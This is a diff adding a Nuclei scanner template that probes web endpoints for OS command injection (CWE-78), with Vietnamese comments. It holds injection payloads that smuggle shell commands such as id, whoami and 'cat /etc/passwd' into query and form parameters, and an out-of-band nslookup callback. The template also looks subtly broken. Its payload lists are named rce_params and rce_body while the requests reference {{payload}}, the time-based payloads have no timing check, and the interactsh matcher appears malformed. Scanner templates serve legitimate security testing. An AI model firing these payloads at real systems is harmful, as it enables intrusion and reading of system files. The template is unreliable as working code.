@@ -1,0 +1,65 @@
+id: CWE-78-OS-Command-Injection
+
+info:
+  name: OS Command Injection (CWE-78) - GET/POST Testing
+  author: security-researcher
+  severity: critical
+  description: "Kiểm thử Command Injection tương thích Nuclei v3.4.1"
+  reference:
+    - https://cwe.mitre.org/data/definitions/78.html
+
+http:
+  # Phần GET Request
+  - method: GET
+    path:
+      - "{{BaseURL}}?safetext={{payload}}"
+      - "{{BaseURL}}/api?cmd={{payload}}"
+    
+    payloads:
+      rce_params:
+        # Linux/Unix Payloads
+        - ";echo VULN_CWE78_$(id);"
+        - "|cat /etc/passwd|"
+        - "%0awhoami%0a"
+        
+        # Windows Payloads
+        - "%26whoami%26"
+        - "%1Fver%1F"
+
+    matchers:
+      - type: word
+        words:
+          - "VULN_CWE78"
+          - "uid="
+          - "root:"
+          - "Microsoft Windows"
+        part: body
+
+  # Phần POST Request (Form Data)
+  - method: POST
+    path:
+      - "{{BaseURL}}/submit"
+      - "{{BaseURL}}/api/execute"
+    
+    body: "username=test&command={{payload}}"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    
+    payloads:
+      rce_body:
+        # Time-based detection
+        - ";sleep 3;"
+        - "%26timeout /t 3%26"
+        
+        # DNS OOB (dùng InteractSH)
+        - "|nslookup {{interactsh-url}}|"
+
+    matchers:
+      - type: word
+        words:
+          - "command not found"
+          - "sleep: invalid"
+        part: body
+
+      - type: interactsh
+        interactsh: true
